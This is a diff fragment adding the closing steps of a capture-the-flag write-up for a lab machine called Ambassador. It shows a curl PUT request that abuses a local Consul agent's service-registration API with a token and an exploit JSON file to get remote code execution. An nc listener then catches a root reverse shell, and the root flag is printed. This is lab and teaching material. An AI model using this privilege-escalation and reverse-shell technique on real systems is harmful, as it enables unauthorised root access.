@@ -828,3 +828,38 @@ We copy the structure of the json data into the exploit and create our own json 
 
 <br />
 
+Once we have the json file in the /tmp path of the Victim Machine, we proceed to execute the following command to see if we are able to carry out the rce and at the same time we listen with nc on port 443 on our Machine to see if we receive the Reverse Shell:
+
+<br />
+
+```bash
+developer@ambassador:/tmp/Privesc$ curl -X PUT "http://localhost:8500/v1/agent/service/register" -H "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5" -d "@exploit.json" ; echo
+```
+
+<br />
+
+And if everything went well, we should have received a shell session as root on port 443:
+
+<br />
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.13] from (UNKNOWN) [10.10.11.183] 54048
+bash: cannot set terminal process group (2703): Inappropriate ioctl for device
+bash: no job control in this shell
+root@ambassador:/# whoami
+whoami
+root
+root@ambassador:/# cat /root/root.txt
+cat /root/root.txt
+d676da4e5b0511f4e2ede1df9b8ec6a7
+```
+
+<br />
+
+We did it! Rooted Ambassador machine!
+
+I hope you enjoyed it. Keep hacking!❤️
+
+<br />
